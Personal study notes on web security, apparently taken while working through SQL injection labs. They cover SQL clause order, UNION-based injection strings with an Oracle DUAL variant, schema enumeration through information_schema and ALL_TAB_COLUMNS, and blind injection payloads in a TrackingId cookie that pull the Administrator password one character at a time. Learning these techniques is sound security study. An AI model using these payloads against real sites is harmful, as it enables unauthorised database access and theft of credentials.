## web security
### learn sql 
```
order of operations

 ( FROM, WHERE, GROUP BY, HAVING,SELECT,DISTNINT,UNION, ORDER BY, LIMIT
https://community.sisense.com/t5/knowledge/sql-order-of-operations/ta-p/8989
SELECT CustomerName, ContactName, Address
FROM Customers
WHERE Address IS NOT NULL;
The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns
' UNION SELECT NULL--: Here, you are injecting a UNION statement with a SELECT statement that returns a single column with a NULL value
oracle:::::::::
' UNION SELECT NULL FROM DUAL--

. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment
```
```
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
The Information Schema COLUMNS table provides information about columns in each table on the server.

https://mariadb.com/kb/en/information-schema-columns-table
all_tables in oracle data base
we always need to specify from for queries of oracle database (we can use table 'dual')
structure of oracle all_Tables
https://docs.oracle.com/cd/B13789_01/server.101/b10755/statviews_1190.htm

ALL_TAB_COLUMNS describes the columns of the tables, views, and clusters accessible to the current user.

https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html
```
### blind
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
SUBSTRING(string_expression, start, length)

intruder in burp
https://sandunigfdo.medium.com/blind-sql-injection-with-conditional-responses-d23ff6660299
```
